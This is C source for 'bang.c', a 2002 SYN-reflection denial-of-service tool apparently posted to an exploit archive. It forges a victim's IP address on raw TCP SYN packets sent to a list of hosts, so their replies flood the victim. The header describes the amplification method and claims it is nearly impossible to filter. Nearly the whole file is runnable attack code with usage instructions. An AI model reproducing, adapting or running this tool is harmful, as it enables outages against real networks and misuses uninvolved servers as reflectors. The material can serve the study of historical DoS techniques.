<html><head><title>TCP SYN Denial of Service Exploit (bang.c)</title></head><pre>/* 
 * BANG.C Coded by Sorcerer of DALnet
 *
 * FUCKZ to: etech, blazin, udp, hybrid and kdl
 * PROPZ : skrilla, thanks for all your help with JUNO-Z and especially this code :)
 *             -------------------------------- 
 * REDIRECTION DOS FINALLY DISTRIBUTED !!!!!!
 *
 * This is POC and demonstrates a new method of DoS. The idea
 * behind it is that the attacker generates connection requests
 * to a list of hosts which have a TCP service running such as
 * http (80), telnet (23) etc. from the ip of the victim host.
 * This will result all of the hosts that the victim *requested*
 * connections to send back packets (usually SYN-ACK's) 2-3 of
 * them (amplification comes here!) causing load to the victim
 * by cauzing the victim to send RST packets since it never actually
 * requested any such connection. This attack is dangerous since
 * its almost impossible to filter!!
 *
 * hosts file should be in the format of 1 ip:port per line
 * i.e. 194.66.25.97:80
 *      130.88.172.194:23
 *      65.161.42.42:6667
 * NOTE: target should only be ip, and all the hosts on the list should
 * also be ips thats for speed issues.
 * 
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#define __FAVOR_BSD

#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/tcp.h&gt;


unsigned short int getrandportid(void);
unsigned short in_cksum(u_short *addr, int len);
short int send_syn(unsigned long int , unsigned long int, unsigned short int);
int sox;

struct pseudo {
  unsigned long srca, dsta;
  unsigned char zero, proto;
  unsigned short tcplen;
};

struct checksum {
  struct pseudo pp;
  struct tcphdr tt;
};

/* Taken out since only works on x86 and rdtsc is also only pentium specific */
#if 0
/* Thanks to skrilla :) */
unsigned short mktcpsum1(struct packet *p,int len) {
  unsigned short old_sum = p-&gt;tcpsum;
  unsigned long s = (unsigned long)&amp;p-&gt;sport;
  unsigned long sum = ((p-&gt;src &gt;&gt; 16) + (p-&gt;src &amp; 0xffff) + (p-&gt;dst &gt;&gt; 16) +
		       (p-&gt;dst &amp; 0xffff) + (__htons__(6) + __htons__(len-20)));
  
  p-&gt;tcpsum=0;
  __asm__ __volatile__ (
			/*&quot;xorl %%eax,%%eax;&quot;
			  &quot;cmpl $2,%%ecx;&quot;
			  &quot;jb 1f;&quot;
			  &quot;0:;&quot;
			  &quot;lodsw;&quot;
			  &quot;addw %%ax,%%dx;&quot;
			  &quot;jnc 9f;&quot;
			  &quot;addl $65536,%%edx;&quot;
			  &quot;9:;&quot;
			  &quot;decl %%ecx;&quot;
			  &quot;loop 0b;&quot;
			  &quot;1:;&quot;
			  &quot;orb %%cl,%%cl;&quot;
			  &quot;jz 2f;&quot;
			  &quot;xorw %%ax,%%ax;&quot;
			  &quot;lodsb;&quot;
			  &quot;addw %%ax,%%dx;&quot;
			  &quot;jnz 2f;&quot;
			  &quot;addl $65536,%%edx;&quot;
			  &quot;2:;&quot;
			  &quot;movw %%dx,%%ax;&quot;
			  &quot;shrl $16,%%edx;&quot;
			  &quot;addw %%ax,%%dx;&quot;
			  &quot;adcl $0xffff0000,%%edx;&quot;
			  &quot;xorw $65535,%%dx;&quot;*/
			
			&quot;movw %%dx,%%ax;&quot;
			&quot;shrl $16,%%edx;&quot;
			&quot;addw %%ax,%%dx;&quot;
			&quot;adcw $0,%%dx;&quot;
			
			&quot;testl $1,%%ecx;&quot;
			&quot;jz 0f;&quot;
			&quot;xorw %%ax,%%ax;&quot;
			&quot;lodsb;&quot;
			&quot;addw %%ax,%%dx;&quot;
			&quot;adcw $0,%%dx;&quot;
			&quot;0:;&quot;
			&quot;shrl $1,%%ecx;&quot;
			&quot;1:;&quot;
			&quot;lodsw;&quot;
			&quot;addw %%ax,%%dx;&quot;
			&quot;adcw $0,%%dx;&quot;
			&quot;loop 1b;&quot;
			&quot;andl $65535,%%edx;&quot;
			&quot;xorw $65535,%%dx;&quot;
			
			:&quot;=edx&quot;(sum):&quot;edx&quot;(sum),&quot;ecx&quot;(len-20),&quot;S&quot;(&amp;p-&gt;sport):&quot;eax&quot;);
  p-&gt;tcpsum=old_sum;
  return(sum);
}

unsigned long long int
rdtsc(void) {
  unsigned long long int tsc;
  unsigned long int tsc_l,tsc_h;
  __asm__ volatile(&quot;rdtsc&quot;:&quot;=%eax&quot;(tsc_l),&quot;=d&quot;(tsc_h));
  tsc=tsc_h;
  tsc=(tsc&lt;&lt;32)|tsc_l;
  return(tsc);
}
#endif

int
main(int argc, char **argv)
{
  int                 enable=1,tmp,tmp2, loop, count=0;
  char               *lala, *tmp1, buf[25];
  unsigned long int   ip[1000000], src;
  unsigned short int  port[1000000];
  FILE               *fp;
  struct timeval      start, end;

  printf(&quot;\nCoded by Sorcerer of DALnet\n\n&quot;);
  
  if(argc != 4){
    fprintf(stderr, &quot;Incorrect usage try: %s &lt;victim&gt; &lt;host-file&gt; &lt;loop host-file&gt;\a\n&quot;, *argv);
    fprintf(stderr, &quot;Example:             %s 127.0.0.1 myhostsfile.txt 3\n\n&quot;, *argv);
    return(-1);
  }
  
  fp = fopen(argv[2], &quot;r&quot;);
  if(fp == NULL){
    fprintf(stderr, &quot;Error while opening: %s\n&quot;, argv[2]);
    perror(&quot;fopen&quot;);
    return(-1);
  }
  
  loop = atoi(argv[3]);
  if(loop == 0){
    fprintf(stderr, &quot;Cannot loop 0 times you need to loop at least once\n&quot;);
    return(-1);
  }
  
  for(tmp=0;tmp&lt;=1000000;tmp++){
    ip[tmp] = htons(23);
    port[tmp] = htons(23);
  }

  sox = socket(PF_INET, SOCK_RAW, 6);
  if(sox == -1){ perror(&quot;socket&quot;); return(-1); }
  
  tmp = setsockopt(sox, IPPROTO_IP, IP_HDRINCL, &amp;enable, sizeof(enable));
  if(tmp == -1){ perror(&quot;setsockopt&quot;); return(-1); }

    
  printf(&quot;Reading ips on memory and reconstructing in network byte order...\n&quot;); fflush(stdout);
  
  while(1){
    memset(buf, 0, 25);

    tmp1 = fgets(buf, 25, fp);
    if(tmp1 == NULL) break;
    
    if(strlen(buf) &lt; 9) {
      printf(&quot;Bogus entry: %s\n&quot;, buf);
      continue;
    }
    
    lala = strchr((char *)&amp;buf, ':');

    port[count] = htons(atoi(++lala));

    buf[strlen(buf)-strlen(lala)-1] = '\0';

    ip[count] = inet_addr(buf);

    count++;
    printf(&quot;.&quot;); fflush(stdout);
  }

  printf(&quot;Done.\n&quot;);

  src = inet_addr(argv[1]);

  tmp = gettimeofday((struct timeval *)&amp;start, NULL);
  if(tmp == -1){ perror(&quot;gettimeofday&quot;); return(-1); }
  

  for(tmp2=0;tmp2&lt;loop;tmp2++)
    for(tmp=0;tmp&lt;count;tmp++)
      send_syn(src, ip[tmp], port[tmp]);
  

  tmp = gettimeofday((struct timeval *)&amp;end, NULL);
  if(tmp == -1){ perror(&quot;gettimeofday&quot;); return(-1); }
  
  printf(&quot;\nTotal time taken: %lu\nBytes sent: %d\n&quot;, (end.tv_sec+end.tv_usec)-(start.tv_sec+start.tv_usec), count*loop*sizeof(char)*sizeof(struct ip)*sizeof(struct tcphdr));
  
  return 0;
}

short int
send_syn(unsigned long int src, unsigned long int dst, unsigned short int port)
{
  struct sockaddr_in  s;
  struct ip           *i;
  struct tcphdr       *t;
  struct pseudo       p;
  struct checksum     c;
  char                packet[sizeof(char)*(sizeof(struct ip)+sizeof(struct tcphdr))];
  int                 tmp;

  s.sin_family       = PF_INET;
  s.sin_port         = port;
  s.sin_addr.s_addr  = dst;
 
  i = (struct ip *)&amp;packet;
  t = (struct tcphdr *)((int)i+sizeof(struct ip));

  memset(&amp;packet, 0, sizeof(packet));

  i-&gt;ip_hl         = 5;
  i-&gt;ip_v          = 4;
  i-&gt;ip_tos        = 0x08;
  i-&gt;ip_len        = htons(sizeof(packet));
  i-&gt;ip_id         = htons(getrandportid());
  i-&gt;ip_off        = 0;
  i-&gt;ip_ttl        = 255;
  i-&gt;ip_p          = 6;
  i-&gt;ip_sum        = 0;
  i-&gt;ip_src.s_addr = src;
  i-&gt;ip_dst.s_addr = dst;


  t-&gt;th_sport = htons(getrandportid());
  t-&gt;th_dport = port;
  t-&gt;th_seq   = htons(getrandportid());
  t-&gt;th_ack   = 0;
  t-&gt;th_x2    = 0;
  t-&gt;th_off   = 5;
  t-&gt;th_flags = 0x02;
  t-&gt;th_win   = 65535;
  t-&gt;th_urp   = 0;
  t-&gt;th_sum   = 0;

  p.srca      = src;
  p.dsta      = dst;
  p.proto     = 6;
  p.tcplen    = htons(sizeof(struct tcphdr));
  p.zero      = 0;
  
  memcpy(&amp;c.pp, &amp;p, sizeof(p));
  memcpy(&amp;c.tt, t, sizeof(struct tcphdr));

  t-&gt;th_sum    = in_cksum((void *)&amp;c, sizeof(c));

  tmp = sendto(sox, packet, ntohs(i-&gt;ip_len), MSG_DONTWAIT, (struct sockaddr *)&amp;s, sizeof(s));
  if(tmp == -1){
    perror(&quot;sendto&quot;);
    return(-1);
  }

  return 0;
}

unsigned short int
getrandportid(void)
{
  unsigned short int port;
  struct timeval tv;

  gettimeofday((struct timeval *)&amp;tv, NULL);
  srand(tv.tv_sec+tv.tv_usec);

  port = rand()+1;

  return(port);
}


/* Slow shit checksum function from RFC */
u_short 
in_cksum(u_short *addr, int len)
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;
  
  while (nleft &gt; 1)  {
    sum += *w++;
    nleft -= 2;
  }
  
  
  if (nleft == 1) {
    *(u_char *)(&amp;answer) = *(u_char *) w;
    sum += answer;
  }
  
  sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
  sum += (sum &gt;&gt; 16);
  answer = ~sum;
  return(answer);
}

// milw0rm.com [2002-09-17]</pre></html>